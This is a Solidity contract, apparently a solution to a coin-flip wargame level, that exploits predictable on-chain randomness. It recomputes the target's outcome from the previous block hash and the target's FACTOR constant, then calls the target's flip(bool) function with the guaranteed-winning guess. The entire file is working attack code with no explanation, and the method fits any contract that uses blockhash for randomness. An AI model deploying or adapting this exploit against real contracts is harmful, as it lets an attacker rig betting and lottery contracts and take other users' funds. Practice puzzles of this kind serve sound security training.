// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.1.0/contracts/math/SafeMath.sol"; 

contract CoinFlipAttack {
  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  event Response(bool success, bytes data, uint256 xxx);

  function attack(address _contract) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    (bool success, bytes memory data) = _contract.call(abi.encodeWithSignature("flip(bool)", side));
    emit Response(success, data, 1234);
  }
}